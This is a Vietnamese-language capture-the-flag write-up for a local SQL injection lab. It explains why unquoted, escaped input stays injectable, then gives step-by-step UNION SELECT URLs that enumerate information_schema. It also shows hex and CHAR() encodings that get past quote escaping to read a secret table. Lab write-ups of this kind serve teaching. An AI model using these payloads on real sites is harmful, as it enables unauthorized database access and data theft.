# SQL Injection 6
# Mục tiêu: Tìm secret trong database
# Phân tích
```
if (isset($_GET["id"])) {
    try {
        include("db.php");
        $database = make_connection("posts_db");

        $id = $database->real_escape_string($_GET["id"]);
        $sql = "SELECT content FROM posts WHERE id=$id";
        // var_dump($sql); // Debugging: Show the SQL query
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row

        if ($row !== NULL)
            $message = "<iframe height='800px' width='100%' src='" . $row["content"] . "'></iframe>";
        else
            $message = "ID not found"; // No result
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}
```
- ở dòng 5 là untrusted data vì có thể nhập một 1 vào.
- ở dòng 11 đã sử dụng luôn id đó.
- Ở đây nó lấy 1 dòng. Có cách nào gộp?
# Khai thác.
```
http://localhost:24001/basic/level6.php?id=4
```
Khi nhập `id`= 4 thì thấy báo `ID not found`.  
Mở `Burp Suite` nên xem có gì không.  
Vì sql chỉ lấy 1 dòng --> thử lấy `version()`.  
```
http://localhost:24001/basic/level6.php?id=4%20UNION%20SELECT%20version()
```
<img src='./img/Screenshot 2025-08-03 at 21.18.49.png'>.  
Phát hiện được `version` src='`8.0.43`'  

Tìm cách lấy các `table` trong `database()`.  
```
http://localhost:24001/basic/level6.php?id=4%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()
```
<img src='./img/Screenshot 2025-08-03 at 21.26.07.png'>.  
Vì là 1 dòng nên sử dụng thêm `GROUP_CONCAT(table_name)` để xem có lấy được thêm `table` nào không.  
<img src='./img/Screenshot 2025-08-03 at 21.28.38.png'>  
Phát hiện thêm table `secret6`.  
Tìm cách lấy các `column_name` trong bảng `secret6`.  
```
http://localhost:24001/basic/level6.php?id=4%20UNION%20SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27secret6%27
```
Lỗi đang bị `escape`
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'secret6\'' at line 1
```
Mà bỏ `'` thì bị coi là 1 `column`
```
http://localhost:24001/basic/level6.php?id=4%20UNION%20SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20secret6

Unknown column 'secret6' in 'where clause'
```
Vậy dùng `hex` thì sao.  
```
http://localhost:24001/basic/level6.php?id=4%20UNION%20SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%200x73656372657436
```
<img src='./img/Screenshot 2025-08-03 at 21.40.59.png'>.  
Biết được trong table `secret6` có 2 column `id,content`. Thử đọc `content` xem có gì.  
```
http://localhost:24001/basic/level6.php?id=4%20UNION%20SELECT%20content%20FROM%20secret6
```
<img src='./img/Screenshot 2025-08-03 at 21.45.25.png'>

Tìm được `flag` thành công.

# Lưu ý
🔁 Cách đổi chuỗi bất kỳ thành HEX:
Bạn có thể dùng lệnh trong terminal hoặc code PHP/Python:
```
echo -n 'posts' | xxd -p
```
Kết quả: `706f737473`

✅ Tại sao phải thêm `0x` trong `0x706f737473`?  
Vì trong MySQL, tiền tố 0x được dùng để biểu diễn một chuỗi nhị phân ở dạng hexadecimal (hex). Khi bạn viết:
```
0x706f737473
```
🔣 2. Dạng CHAR()
Bạn có thể dùng hàm CHAR() để chuyển từng ký tự ASCII:
```
'posts' == CHAR(112,111,115,116,115)
```
▶ Ví dụ:
```
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME=CHAR(112,111,115,116,115)
```

✅ Tổng kết:
- `0x` là cách MySQL hiểu chuỗi hex.

- `0x706f737473` = `'posts'`